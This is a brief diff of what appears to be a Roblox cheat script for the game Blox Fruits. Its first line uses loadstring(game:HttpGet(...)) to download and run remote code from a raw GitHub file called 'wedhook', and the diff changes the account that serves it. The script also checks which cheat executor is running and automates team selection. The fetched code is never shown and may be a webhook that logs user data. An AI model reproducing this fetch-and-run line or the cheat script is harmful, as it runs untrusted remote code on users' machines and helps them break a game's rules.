@@ -1,5 +1,5 @@
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Chetdithglon/lklklkl/main/wedhook'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/sadsadsafdfasf/b/main/wedhook'))()
 
            if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
 local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Shit exploit g"
@@ -534,4 +534,3 @@ if (_G.Team == "Pirates" or _G.Team == "Marines") and not join then
     until join == true
     game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Visible = false
 end
-
